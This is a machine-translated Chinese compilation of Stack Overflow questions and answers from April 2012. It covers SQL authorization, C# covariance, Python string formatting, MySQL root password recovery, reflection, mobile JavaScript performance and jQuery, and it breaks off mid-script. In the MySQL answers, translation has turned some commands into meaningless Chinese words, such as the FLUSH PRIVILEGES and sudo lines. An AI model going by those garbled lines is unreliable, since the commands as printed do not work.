# StackOverflow 问答 10338000-10338999

# sql - 如何进行基于内容的授权？

> ID：10338000
> 
> 赞同：0
> 
> 时间：2012-04-26T16:59:59.750
> 
> 标签：sql, architecture, authorization

**概括**

* * *

我有一些复杂的数据库结构，我只想将数据提供给授权成员——他们的角色也取决于存储在数据库中的数据。它一直工作到现在，但现在我想扩展服务，它变得非常复杂。必须有一种优雅的方式。

*注意*：我没有使用 ASP.NET，所以请不要建议那些与它紧密相关的补救措施，尽管我对授权过程建模的想法持开放态度。

**背景**

* * *

好吧，我之前也问过这个问题，但令我惊讶的是，它并没有得到任何好的回应，所以我在这里用不同的词再次发布它。我正在开发一个 Web 应用程序，并且在如何以优雅的方式对授权过程进行建模时遇到问题。

假设我有一个提供以下服务的应用程序。有“项目”/工作区，您可以在其中发布内容并评论这些帖子。被视为“开放”的项目也可以被“关注” - 因此关注者可以访问内容。为了使这种情况更接近我的实际服务，项目“成员”可以决定追随者可以访问的内容。这可能（或可能不！）看起来很复杂，但实际的应用程序更复杂。我所做的是在 sql 查询本身中填写过滤代码。这是一个代码示例：

```
 public function getProjectById($id) {
        $auth = new Auth();
        $userid = $auth->getCurrentUserId();

        $sql = "
          SELECT P.id, P.userId, P.name, P.description,
                 P.creationTime, P.startTime, P.endTime, P.isOpen
          FROM       projects P
          INNER JOIN project_members PM
                      ON PM.projectid = P.id
                     AND P.id = '{id}'
                     AND (PM.userId = '{userid}' OR P.isOpen = 1)
        ";

        return $this->result($sql, array( "userid" => $userid, "id" => $id ));
    } 
```

这看起来很糟糕，因为我还必须将此数据提供给项目关注者（此处未显示）。评论和帖子处理代码的复杂性增加了。现在，有没有更好的方法来做到这一点 - 必须有。我应该将授权逻辑分离到其他类吗？或者/我应该在数据库中使用“视图”（完全没有必要，但我仍然想指出它们不是 MVC 视图）？或者还有更好的、不笨拙的方法来解决这个问题吗？

欢迎所有建议 - 即使是那些旨在更改数据库结构的建议 - 尽管我想知道为什么需要这样做。

提前致谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-26T19:55:48.673

我认为您在视图方面处于正确的轨道上，但由于每次调用都需要传递用户 ID，听起来您真正需要的是表值函数。我最熟悉 Microsoft SQL，它看起来像这样：

```
SELECT P.*
FROM Projects AS P
     INNER JOIN dbo.AuthProjects(@UserID) AS AP ON P.ProjectID = AP.ProjectID 
```

请注意，TVF 从字面上返回一个表，您可以加入该表以查看哪些项目可用。TVF 定义可能如下所示：

```
CREATE FUNCTION dbo.AuthProjects(@UserID INT)
    RETURNS @Results TABLE (ProjectID INT NOT NULL, WriteAccess BIT NOT NULL)
AS BEGIN
    INSERT INTO @Results (ProjectID, WriteAccess)
        SELECT
            ProjectID, WriteAccess
        FROM
            Authorizations
        WHERE
            UserID = @UserID

    -- Additional logic for more ways a project may be authorized

    RETURN
END 
```

# http - 您如何解决因将本地图像放置在网站上而导致的“403 禁止错误”？

> ID：10338003
> 
> 赞同：3
> 
> 时间：2012-04-26T17:00:01.400
> 
> 标签：http, http-status-code-403

我在我的 Mac 上本地托管了一个网站（所有文件都位于我计算机上的“站点”文件夹中（~/Sites）。我正在尝试将图像添加到我的网站，但我收到了 403 禁止错误：:" NetworkError: 403 Forbidden - [http://172.28.15.5/~user/image.png](http://172.28.15.5/~user/image.png) "

有人知道吗

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-26T17:02:28.740

检查文件和站点文件夹的权限。确保站点文件夹具有 o+x（公共输入）权限并且图像具有 o+r（公共读取）权限，因为当您尝试使用 Web 浏览器访问它时，您将被视为公共

# c# - 为什么我不能以这种方式实现接口？

> ID：10338004
> 
> 赞同：12
> 
> 时间：2012-04-26T17:00:02.883
> 
> 标签：c#

> **可能重复：**
> [C# 是否支持返回类型协方差？](https://stackoverflow.com/questions/5709034/does-c-sharp-support-return-type-covariance)

我不确定我是否只是愚蠢...

如果我有一个界面：

```
public interface IMoop
{
    object Moop();
} 
```

为什么我不能像这样实现它（我想这会使用隐式协方差？）

```
public class MoopImplementor : IMoop
{
    string Moop();
} 
```

MoopImplementor 的任何实例都将满足 IMoop 指定的合同，所以看起来应该没问题。

请赐教：）

编辑：要清楚——因为实现类返回的东西继承自接口方法的返回类型——我觉得这应该可行。具体来说，一个`string`是一个`object`。（对于任何其他继承链也是如此）。

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-04-26T17:21:20.957

C# 不支持用于接口实现或虚拟方法覆盖的*返回类型协变。*有关详细信息，请参阅此问题：

[C# 是否支持返回类型协方差？](https://stackoverflow.com/questions/5709034/does-c-sharp-support-return-type-covariance/5709191#5709191)

从 C# 4 开始，C# 确实支持*使用类型参数的引用类型构造的接口和委托类型的泛型协变和逆变*。

And C# does support *return type covariance* when *converting a method that returns a reference type to a delegate type whose return type is a compatible reference type.* (And similarly it supports parameter type *contravariance*.)

If this subject interests you, I have written a great many articles discussing various versions of variance that C# does and does not support. See

[https://blogs.msdn.microsoft.com/ericlippert/tag/covariance-and-contravariance/](https://blogs.msdn.microsoft.com/ericlippert/tag/covariance-and-contravariance/)

for details.

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-04-26T17:03:12.120

因为接口指定方法必须返回一个`object`. A`string`可以继承自`object`，但接口指定了一个返回更通用类型的方法。

但是请记住，没有什么可以阻止您执行以下操作：

```
public object Moop()
{
    return "Some new string";
} 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-04-26T17:07:57.223

一个合理的解决方法：

```
public class MoopImplementor : IMoop {
  public string Moop() { ... }
  object IMoop.Moop() { return Moop(); }
} 
```

这允许公共实现`MoopImplementor`具有更准确的类型，同时仍然满足接口的要求。

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-04-26T17:05:51.797

你没有履行合同。但是，您可以使用泛型执行此操作：

```
public interface IMoop<T>
{
    T Moop();
}

public class MoopImplementor : IMoop<string>
{
    public string Moop() { return ""; }
} 
```

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-04-26T17:19:56.663

来自[C# 语言规范](http://msdn.microsoft.com/en-us/library/ms228593.aspx)：

## 13.4.4 接口映射

> 出于接口映射的目的，类成员 A 在以下情况下与接口成员 B 匹配：
> 
> *   A 和 B 是方法，A 和 B 的名称、**类型**和形参列表**相同**。

请注意，它没有说明继承或可转换性！返回类型必须相同。

# python - % 在 Python 中是什么意思？难以理解

> ID：10338011
> 
> 赞同：2
> 
> 时间：2012-04-26T17:00:30.317
> 
> 标签：python

我现在已经在论坛上搜索了一点，我仍然很困惑。如果有人可以指导我阅读更深入地解释这一点的文章，我将不胜感激。我正在介绍 python 课程，并找到了解决问题的方法，但我想知道它是如何工作的。任务是返回一名球员的击球率，并按照 MLB 的显示方式显示。因此，例如 8 次击球中的 4 次安打将是 0.500。这是我发现有效的代码。

```
from __future__ import division, print_function

def print_batting_average(at_bats, hits):
    average_str = "%.3f" % (hits / at_bats)
    if average_str.startswith("0"):
        average_str = average_str[1:]
    print("Batting average is", average_str)

print_batting_average(4, 2) 
```

我知道 % 是模数并给出了余数。我只是不明白它如何适合代码的其他部分。例如“%.3f”。我也看到了 % 以不同的方式使用，我只是想找到一个好的解释。希望我不会因为提出这个问题而受到抨击。谢谢你的帮助。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-26T17:03:48.957

在您询问的上下文中，`%`用于帮助格式化输出，与任何 mod 操作无关。

例如，`%3d`,`%.2f`都是格式化输出的不同方式。第一个示例意味着您要显示一个整数并为其保留 3 个空格。第二个表示您要显示浮点类型值，小数点后有 2 个数字。

`String Formatting Operations`有关各种格式类型和选项的更多信息和详细信息， 请参阅[http://docs.python.org/library/stdtypes.html#string-formatting-operations](http://docs.python.org/library/stdtypes.html#string-formatting-operations) 。

你可能会遇到这样的事情：

```
number_of_Widgets = 5
cost = 66.8788
print 'Total cost for %d widgets is $ %5.2f.' % (number_of_Widgets, cost) 
```

产量：

```
Total cost for 5 widgets is $ 66.88. 
```

' ' 中包含的部分使用格式化指令作为行尾提供的实际变量值的占位符。这些值以 % 开头，然后 () 包含提供这些值的变量。

这是一个简单的示例，说明为什么格式字符串可以方便地格式化输出：

这里我们没有为数字保留和额外的空间，你可以看到它在达到 10 时移动输出。

```
In [9]: for i in xrange(5,15):
   ...:     print '%d is the number' % i
   ...:
5 is the number
6 is the number
7 is the number
8 is the number
9 is the number
10 is the number
11 is the number
12 is the number
13 is the number
14 is the number 
```

在这里，我们用两个空格格式化数字，并为单个数字获取前导空格。

```
In [10]: for i in xrange(5,15):
   ....:     print '%2d is the number' % i
   ....:
 5 is the number
 6 is the number
 7 is the number
 8 is the number
 9 is the number
10 is the number
11 is the number
12 is the number
13 is the number
14 is the number 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-26T17:05:06.257

算术表达式中的％是指模数。

像 "%.3f" 这样的文字字符串中的 % 只是一个普通字符；它与模数无关。

但是当您将它们与 % 运算符一起使用时，其中带有 % 符号的字符串是特殊的。在这种情况下，左边的值是一个字符串，所以模数的含义不适用；相反，你会得到格式化。字符串中的 %-sequences 是占位符，被元组中的值替换，根据字符串中每个 '%' 之后的内容进行格式化。例如，“%.3f”表示“小数点后三位的浮点值”。

有关格式规范的详细信息，请参见[http://docs.python.org/library/stdtypes.html#string-formatting](http://docs.python.org/library/stdtypes.html#string-formatting)；`printf`它与C 中的函数族大致相同。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-26T17:04:54.847

在：

```
"%.3f" % (hits / at_bats) 
```

百分号以两种不同的方式使用，这两种方式都与模运算符无关。

具体来说：

*   第二个`%`是[字符串格式化操作符](http://docs.python.org/library/stdtypes.html#string-formatting-operations)；
*   第一个`%`与第一个结合使用，定义了实际使用的格式。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-26T17:04:04.073

看看这个[http://docs.python.org/release/2.6/library/string.html](http://docs.python.org/release/2.6/library/string.html)

> “格式规范”在格式字符串中包含的替换字段中使用，以定义如何呈现单个值（请参阅格式字符串语法。）它们也可以直接传递给内置的 format() 函数。每个可格式化的类型都可以定义如何解释格式规范。

Python中的模函数只是`mod(p,q)`

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-04-26T17:04:54.240

`%`用于格式化字符串的 与模运算符不同。注意它是如何在引号内的。

`%`对于字符串格式化是许多编程语言的标准和约定 - [http://en.wikipedia.org/wiki/Printf_format_string](http://en.wikipedia.org/wiki/Printf_format_string)

# mysql - 当前密码未知时重置 MySQL root 密码

> ID：10338015
> 
> 赞同：21
> 
> 时间：2012-04-26T17:00:44.117
> 
> 标签：mysql, passwords

我继承了一台安装了 mysql 的服务器。我没有任何用户的 mysql 密码，甚至没有 root（尽管我有 linux root 密码）。另外，我只知道另一个用户帐户 besdies root，并且没有权限执行任何操作，甚至没有 SELECT。

我尝试停止 mysql servicw，使用跳过授权表选项重新启动，然后在没有密码的情况下登录：

```
service mysqld stop
service mysqld start --skip-grant-tables &
mysql -u root 
```

但是得到以下错误：

```
Access denied for user 'root'@'localhost' (using password: NO) 
```

然后我尝试重置密码：

```
mysqladmin -u root password 'newpw' 
```

但这也给出了拒绝访问错误。

我还尝试以其他用户身份（没有 pw）登录并执行以下命令：

```
UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root'; 
```

并得到这个错误：

```
ERROR 1142 (42000): UPDATE command denied to user ''@'localhost' for table 'user' 
```

我也试过删除mysql并重新安装，但我得到了同样的错误。

有什么建议么？

* * *

## 回答 #1

> 赞同：34
> 
> 时间：2014-01-24T07:43:20.253

尝试`sudo dpkg-reconfigure mysql-server-5.5`，您将被要求输入新的root密码。

将 5.5 替换为您当前的 mysql-server 版本

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-04-26T20:25:25.150

两种选择：

如果您想使用 --skip-grant-tables ，您可能需要直接启动 mysqld，因为这些选项不一定会通过 init 脚本传递。

否则，请尝试手册中的[这些说明](http://dev.mysql.com/doc/refman/5.0/en/resetting-permissions.html#resetting-permissions-unix)。

* * *

## 回答 #3

> 赞同：6
> 
> 时间：2014-05-03T03:02:44.587

您需要确保使用 sudo 命令以 root 身份运行该命令。

我发现这个重置mysql密码的[指令](https://help.ubuntu.com/community/MysqlPasswordReset)效果很好。

按照此过程，您将禁用 MySQL 服务器上的访问控制。所有连接都将具有根访问权限。将服务器从网络中拔出或至少禁用远程访问是一件好事。

要重置您的 mysqld 密码，只需按照以下说明操作：

```
Stop the mysql demon process using this command :

       sudo /etc/init.d/mysql stop

Start the mysqld demon process using the --skip-grant-tables option with this command

       sudo /usr/sbin/mysqld --skip-grant-tables --skip-networking & 
```

因为此时您没有检查用户权限，所以禁用网络是最安全的。在 Dapper 中，/usr/bin/mysqld... 不起作用。但是， mysqld --skip-grant-tables 做到了。

```
start the mysql client process using this command

       mysql -u root

from the mysql prompt execute this command to be able to change any password

       FLUSH PRIVILEGES;

Then reset/update your password

       SET PASSWORD FOR root@'localhost' = PASSWORD('password');

If you have a mysql root account that can connect from everywhere, you should also do:

       UPDATE mysql.user SET Password=PASSWORD('newpwd') WHERE User='root';

Alternate Method:

       USE mysql
       UPDATE user SET Password = PASSWORD('newpwd')
       WHERE Host = 'localhost' AND User = 'root';

And if you have a root account that can access from everywhere:

       USE mysql
       UPDATE user SET Password = PASSWORD('newpwd')
       WHERE Host = '%' AND User = 'root'; 
```

对于任何一种方法，一旦收到指示查询成功（受影响的一个或多个行）的消息，刷新权限：

同花顺特权；

然后停止 mysqld 进程并以经典方式重新启动它：

sudo /etc/init.d/mysql 停止

须藤 /etc/init.d/mysql 启动

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2014-01-21T08:53:02.333

> `UPDATE mysql.user SET Password=PASSWORD('MyNewPass') WHERE User='root'; 同花顺特权；

将 UPDATE 和 FLUSH 语句分别写在一行上。UPDATE 语句重置所有 root 帐户的密码，FLUSH 语句告诉服务器将授权表重新加载到内存中，以便它注意到密码更改。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2014-03-03T02:15:18.307

在我的情况下发生了同样的事情，但我在登录 mysql 提示符时犯了错误。我是用 mysql 而不是 mysql -u root -p

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-11-03T08:42:47.577

对于 Ubuntu 16.04 上的 mysql 5.7.16，这有效：

*   无密码登录：

    sudo mysqld_safe --skip-grant-tables --skip-networking &

*   更改密码：

    设置'root'@'localhost'='mypass'的密码；

[在MySQL 5.7 参考手册](http://dev.mysql.com/doc/refman/5.7/en/assigning-passwords.html)上找到解决方案

# c# - 如何使用反射获取属性值

> ID：10338018
> 
> 赞同：39
> 
> 时间：2012-04-26T17:01:01.230
> 
> 标签：c#, reflection

我有以下代码：

```
FieldInfo[] fieldInfos;
fieldInfos = GetType().GetFields(BindingFlags.NonPublic | BindingFlags.Instance); 
```

我要做的是在运行时使用反射获取当前实例化实例的属性之一的值。我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：89
> 
> 时间：2012-04-26T17:05:25.493

像这样的东西应该工作：

```
var value = (string)GetType().GetProperty("SomeProperty").GetValue(this, null); 
```

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2012-04-26T17:03:12.260

尝试[GetProperties](http://msdn.microsoft.com/en-us/library/kyaxdd3x.aspx)方法，它应该为您获取属性，而不是字段。

要检索该值，请执行以下操作：

```
object foo = ...;
object propertyValue = foo.GetType().GetProperty("PropertyName").GetValue(foo, null); 
```

这是使用 GetProperty，它只返回一个 PropertyInfo 对象，而不是它们的数组。然后我们调用 GetValue，它接受对象的一个​​参数以从中检索值（PropertyInfo 特定于类型，而不是实例）。GetValue 的第二个参数是索引器数组，用于索引属性，我假设您感兴趣的属性不是索引属性。（索引属性可以让您`list[14]`检索列表的第 14 个元素。）

# javascript - Sencha Touch 2 安卓性能

> ID：10338020
> 
> 赞同：13
> 
> 时间：2012-04-26T17:01:11.213
> 
> 标签：javascript, android, extjs, webview, sencha-touch-2

我听说煎茶一般来说，仅仅因为使用 javascript，在 android 设备上存在性能问题。

我熟悉 android webview 对象的限制，但我想知道这些性能声明是否有任何优点，尤其是在 Sencha Touch 2 出局的情况下

虽然我没有低端的安卓设备，但我浏览了 Sencha Touch 2 库，并不能很容易地找到免费的安卓应用程序，所以也许你可以解释一下你在安卓上使用 Sencha Touch 2 的体验以及你做了什么它更快

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-04-26T17:30:28.253

根据我目前的经验，在开发具有最佳性能的 Sencha Touch 2 应用程序时，需要牢记一些关键点：

1.  优化应用程序启动时间：

    *   压缩您的 JS 和 CSS 文件。删除任何未使用的 JS 函数或 CSS mixin（这可以通过 SASS/Compass 轻松完成）。更多详情，请阅读：[http ://www.sencha.com/blog/an-introduction-to-theming-sencha-touch](http://www.sencha.com/blog/an-introduction-to-theming-sencha-touch)
    *   动态加载外部 JS 文件，这里已经有一个很好的话题：[Sencha Touch 2 中加载外部 javascript 的正确方法是什么](https://stackoverflow.com/questions/10334893/what-is-the-proper-way-to-load-an-external-javascript-in-sencha-touch-2)
2.  优化应用程序性能：

    *   保持你的 DOM 结构尽可能小。不活动的视图应该被销毁（如果需要，稍后动态添加到您的容器中）。
    *   避免使用过多的 CSS3 属性，因为它们在 Android 设备上非常慢。
    *   对于任何滚动视图，应在 Android 上禁用过度滚动。我已经在 Android 设备上测试了许多 Sencha Touch 2 应用程序，并且由于延迟和滞后，过度滚动会导致非常不愉快的体验。（在 Galaxy Tab、Nexus S 和一些 HTC 上测试）

这里还有一个话题与您的关注非常相关：

[PhoneGap 1.4 包装 Sencha Touch 2.X - 性能如何？](https://stackoverflow.com/questions/10085637/phonegap-1-4-wrapping-sencha-touch-2-x-what-about-performance/10085756#10085756)

希望能帮助到你。

***2014 年 2 月 12 日编辑****：我发布这个答案已经快 2 年了（即我使用 Sencha Touch 已经 3 年多了），我不得不说 Android 上的 Sencha Touch 性能令人遗憾的是不可接受的。有时我会陷入我没有完全掌握最佳实践的想法，但我认为这不是原因。或者至少，我们需要花费数年时间才能开发出与原生应用程序具有同等“外观和感觉”的大型 Sencha Touch 应用程序，因为这些技巧需要我们花费大量时间。*

*所以简而言之，如果你的目标是 iOS 或者你的应用程序非常小，那没关系。但对于 Android 上的大型应用程序，我个人不使用 Sencha Touch。*

# javascript - 重建 jQuery Mobile ListView 响应速度不快，我该如何改进？

> ID：10338024
> 
> 赞同：0
> 
> 时间：2012-04-26T17:01:36.913
> 
> 标签：javascript, performance, listview, dom, jquery-mobile

我有一个 JQM ListView，每页最多 25 个项目。

我正在重建页面删除“li”项目并添加新项目，但从按钮被点击到列表是重建的 UI 似乎没有响应。

要添加列表项，我会生成一个包含所有“li”项的 HTML 字符串，并将整个“html li´s”附加到列表中。

我不知道是否是动态生成列表视图的最佳方法，您能提供一些建议吗？

这是 Chrome 中的 CPU 配置文件： http: [//cl.ly/2x1L303t3A432L290Y0j/o](http://cl.ly/2x1L303t3A432L290Y0j/o) 抱歉，这张大图我不知道如何以更易读的格式导出。在 Chrome 中，数字太低，响应性很好，我不知道如何在这里找到问题：-S 你知道如何做这样的配置文件，但是在移动设备（iPhone 或 Android，不知道问题）？

下面是一些代码：

```
function generate_listview(data)
{
    var lv_html = '',
        group = data.group_by_dia,
        last_dia,
        init_item = (items_per_page * current_page) -items_per_page,
        get_item_func = (data.gym == 'Tots') ? get_new_item_with_gymn : get_new_item;

    if (current_page != num_pages) {
        final_item = (items_per_page * current_page);
    }else{
        var resto = Math.round(cache_activities.activitats.length%items_per_page);
        final_item = init_item + ((resto > 0) ? resto : items_per_page);
    }
    var acts = data.activitats.slice(init_item, final_item);

    $activitats_list.append('<li data-role="list-divider">Gimnasos: ' + data.gym + " - Dia: " + data.dia + " - Activitat: " + data.activitat + " >> Trobades: " + cache_activities.activitats.length + '</li>');
    if (group){
         $.each(acts, function(index, value) { 
            if(value.d != last_dia) {
                lv_html += '<li data-role="list-divider">' + value.d + '</li>';
            }
            lv_html += get_item_func(value,data.gym);
            last_dia = value.d;
        });
    }else{
        $.each(acts, function(index, value) { 
            lv_html += get_item_func(value);
        });  
    }

    $activitats_list.append(lv_html);
    $activitats_list.listview("refresh");
    $.mobile.hidePageLoadingMsg();
    $header_p2.text(header_text + ' ' + current_page + '/' + num_pages);
}
function get_new_item(value)
{
    var startItem   = '<li data-theme="c">',
        endItem     = '</li>',
        color_activitat = '<span class="ui-li-aside ui-li-desc" style="background-color: yellow; width:15px; color: yellow">.</span>';
    return startItem + 
        '<h3 class="ui-li-heading">' + value.a  + '</h3>' + 
        '<p class="ui-li-desc">' + 
            '<strong>Sala: </strong>' +  value.s + 
            ' <strong>Dia: </strong>' + value.d + ' (' +value.i + ' - ' + value.f + ')' + 
        '</p>' + endItem;
}
function get_new_item_with_gymn(value,gym_name)
{
    var startItem   = '<li data-theme="c">',
        endItem     = '</li>',
        gym_item    = '<strong>Gimn&agrave;s: </strong>' + value.g + ' ',
        new_line = '</p><p class="ui-li-desc">',
        color_activitat = '<span class="ui-li-aside ui-li-desc" style="background-color: yellow; width:15px; color: yellow">.</span>';
    return startItem + 
        '<h3 class="ui-li-heading">' + value.a  + '</h3>' + 
        '<p class="ui-li-desc">' + gym_item + 
        '<strong>Sala: </strong>' +  value.s + new_line + 
        ' <strong>Dia: </strong>' + value.d + ' (' +value.i + ' - ' + value.f + ')' + 
        '</p>' + endItem;
}
function go_next () {
    current_page += 1;
    if (current_page > num_pages) {
        current_page = num_pages;
    }else{
        $.mobile.showPageLoadingMsg();
        $activitats_list.find('li').remove().end();
        generate_listview(cache_activities);    
        $.mobile.silentScroll(0);
    }
    if (current_page == num_pages){
        $next_btn.button('disable');
        $next_btn_down.button('disable');
        $prev_btn.button('enable');
        $prev_btn_down.button('enable');
    }else{
        $prev_btn.button('enable');
        $prev_btn_down.button('enable');
    }
}
function go_previous () {
    current_page -= 1;
    if (current_page <= 0) {
        current_page = 1;
    }else{
        $.mobile.showPageLoadingMsg();
        $activitats_list.find('li').remove().end();
        generate_listview(cache_activities);    
        $.mobile.silentScroll(0);        
    }
    if (current_page == 1) {
        $prev_btn.button('disable');
        $prev_btn_down.button('disable');
        $next_btn.button('enable');
        $next_btn_down.button('enable');
    }else{
        $next_btn.button('enable');
        $next_btn_down.button('enable');
    }
} 
```

# ruby-on-rails - 什么是 ruby /rails 中的工人？

> ID：10338029
> 
> 赞同：27
> 
> 时间：2012-04-26T17:01:53.443
> 
> 标签：ruby-on-rails, ruby

我来自 Java 世界，在 ruby​​/rails 世界中不断听到“工人”这个词。它是什么？一个线程？

* * *

## 回答 #1

> 赞同：32
> 
> 时间：2012-04-26T17:22:21.283

取决于上下文。

工作人员通常是在您的应用程序请求周期之外运行的进程。[像resque](https://github.com/resque/resque)和[delay_job](https://github.com/collectiveidea/delayed_job)这样的Ruby 库通常用于管理工作队列。

另一方面，如果我们谈论 Web 服务器，“worker”这个词有时可以与线程或进程互换使用（即：nginx 或 apache“workers”）。

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2012-04-26T17:18:08.623

通常在“Rails 世界”中，worker 指的是优先队列类型系统，该系统具有单独的进程弹出任务以在应用程序周期之外执行。这些系统中最受欢迎的系统之一是[DelayedJobs](https://github.com/collectiveidea/delayed_job)。这使用数据库迁移来添加一个表来保存要由工作进程执行的任务。然后，您可以配置任意数量的工作进程来检查 DelayedJobs 队列表并执行序列化任务。使用 DelayedJobs，您不仅可以设置不同任务的优先级，还可以设置执行任务的时间范围，例如。从现在起 1 小时后发送一封特定的电子邮件。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-26T17:09:10.480

运行您的 rails 应用程序的服务器使用工作人员来完成应用程序所需的所有事情。它发送电子邮件、运行请求、执行计算等。您需要的工作人员数量取决于您的 Web 应用程序需要执行的流量和计算量。

# java - Java泛型从类型到类

> ID：10338032
> 
> 赞同：1
> 
> 时间：2012-04-26T17:02:08.210
> 
> 标签：java, reflection, java-7

我编写了一个通用类来帮助我们更轻松地编写单元测试。它基本上允许我们使用相同的方法来设置我们的测试，并有一些常用的方法来测试。我知道泛型类的重点是不关心我们正在使用什么类，但拥有这些信息是有帮助的（具体实现可以有一个适当类型的实例变量）。

这是我的课：

```
public abstract class AbstractModuleTest<M extends Module> {
  @Autowired protected WebDriver driver;
  private final Type type;

protected AbstractModuleTest() {
  final ParameterizedType parameterizedType = 
      (ParameterizedType) getClass().getGenericSuperclass();
  type = parameterizedType.getActualTypeArguments()[0];
}

protected <S extends AbstractPage> M setup(final S s, final String errorMsg) {
  for (final Module m : s.getModules()) {
    if (m.getClass().equals(type)) {
      try {
        final Class c = Class.forName(StringUtils.subStringAfter(type.toString(), " "));
        return (M) c.cast(m);
      } catch (ClassNotFoundException cnfe) { throw new RuntimeException(cnfe); }
    }
  }
  Assert.fail(errorMsg);
} 
```

有没有更简单的方法来获取我正在处理的类（以避免 StringUtils.substringAfter 调用）？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-26T17:08:15.570

你不需要`Class`那种方法。`m.getClass().equals(type))`返回时`true`进行未经检查的强制转换是安全的（如果是通用的，可能会出现一些极端情况`M`，但您的代码也无法捕获它们）：

```
protected <S extends AbstractPage> M setup(final S s, final String errorMsg) {
    for (final Module m : s.getModules()) {
        if (m.getClass().equals(type)) {
            @SuppressWarnings("unchecked")
            M result = (M) m;
            return result;
        }
    }
    Assert.fail(errorMsg); 
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-26T17:14:09.257

类名不能包含空格，那么您可以使用 split 方法来避免使用 StringUtils。

```
type.toString().split(" ")[1]; 
```

# node.js - 如何在 node.js 中查看警告和错误消息？

> ID：10338034
> 
> 赞同：2
> 
> 时间：2012-04-26T17:02:15.340
> 
> 标签：node.js, error-handling

如何在 Node 中获取错误报告？我正在运行 v0.6.15（使用简单的 osx 安装 DMG），每当出现错误时，比如说我尝试使用未定义的变量，该过程就会停止而没有说明原因。

我想我正在寻找 PHP 的 error_reporting(E_ALL) 的节点版本；

有什么建议么？

==编辑==

奇怪......好吧......所以我注意到我在运行的文件中得到了很好的错误，但不是在我“需要”的文件中

我正在运行的文件只有这个代码

```
process.on('uncaughtException', function(err) {
  console.log(err);
});

var ImageProcessor = require('./ImageProcessor').ImageProcessor;
var imageProcessor = new ImageProcessor();

imageProcessor.imageRequestEnd(); 
```

imageProcessor 是一个 mootools 类，如果这很重要，但不使用其他任何特殊的东西。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-26T18:03:37.343

虽然我同意@Brad 我从未见过这样的行为，但总的来说，如果您正在调试 NodeJS 程序并想知道是什么导致它被杀死，您可以使用这样的构造：

```
process.on('uncaughtException', function(err) {
  console.log(err);
}); 
```

在你的脚本中。

请注意，许多人争辩说您不应该在生产中使用这样的构造，因为未捕获的异常通常表明您遇到了一个如此严重和意外的错误，以至于恢复的唯一方法是重新启动。对于您的特定应用程序而言，这可能是正确的，也可能不是；无论如何，这对调试很有用。

*但是，就像@Brad 指出的那样，您看不到任何东西*的最可能原因是控制台输出以某种方式被重定向。尝试在不使用“forever”、“supervisor”、“screen”或您正在使用的任何其他进程包装器的情况下运行。

# jquery - 在 jquery 函数中隔离一个类

> ID：10338035
> 
> 赞同：0
> 
> 时间：2012-04-26T17:02:19.213
> 
> 标签：jquery, function, jquery-selectors, accordion, drop-down-menu

我希望这是一个简单的修复，或者我的逻辑可能是错误的。我正在使用 jquery 创建手风琴菜单。手风琴的头部有单选按钮，机身内部有时间表。I want the user to be able to expand and collapse the accordion, and when a schedule is chosen, the selected schedule will be outlined in red with a light grey background. 我正在工作，它只是将箭头旋转和toggleClass应用于每个元素，而不是选择的单个元素。

当前发生的情况是，当您单击“计划”时，所有箭头都在旋转，而不是单个箭头。Also, when a radio button is selected , it is highlighting every div with the "clickedSchedule" class.

我认为这与在函数中使用 (this) 有关...我只是不确定如何编写它。也许我也没有以优雅的方式执行此操作，因此我对所有建议持开放态度。

**HTML：**

```
 <ul id="menu" class="dropdown">
    <div class="clickedSchedule">
    <li><a class="expanded"><div class="arrow"></div><h2>Schedule 1</h2></a>

    <div class="scheduleChoice" style="text-align:left;">
      <input name="first_choice" id="checkbox_first" type="radio" value="Schedule 1" /><label>First Choice</label>
      <input name="second_choice" id="checkbox_second" type="radio" value="Schedule 1" /><label>Second Choice</label>
      <input name="third_choice" id="checkbox_third" type="radio" value="Schedule 1" /><label>Third Choice</label>
    </div>
        <ul>
            <li>

              <div><img src="images/01_fall.gif" width="550" height="334" /></div>
              <div><img src="images/01_sp.gif" width="550" height="334" /></div>

            </li>
        </ul>
    </li>
    </div>

    <div class="clickedSchedule">
    <li><a class="expanded"><div class="arrow"></div><h2>Schedule 2</h2></a>
    <div class="scheduleChoice" style="text-align:left;">
      <input name="first_choice" id="checkbox_first" type="radio" value="Schedule 2" /><label>First Choice</label>
      <input name="second_choice" id="checkbox_second" type="radio" value="Schedule 2" /><label>Second Choice</label>
      <input name="third_choice" id="checkbox_third" type="radio" value="Schedule 2" /><label>Third Choice</label>
    </div>
        <ul>
            <li>            
                <div><img src="images/02_fall.gif" width="550" height="334" /></div>
                <div><img src="images/02_sp.gif" width="550" height="334" /></div>
            </li>
        </ul>
    </li>
    </div>
</ul> 
```

**jQuery**

```
<script>
//Expand/Collapses Menu & Rotates arrow
$(document).ready(function() {
    $("#menu:first li > a").click(function() {
        $(this).toggleClass("expanded").toggleClass("collapsed").parent().find('> ul').slideToggle("fast");
        $("#menu:first li > a > div").toggleClass("arrowUp").toggleClass("arrow");
    });
});
</script>
<script>
//highlights chosen Schedule
$(document).ready(function(){

  $("input[name$='first_choice']").click(function(){

  var radio_value = $(this).attr("checked");

  if(radio_value=='checked') {
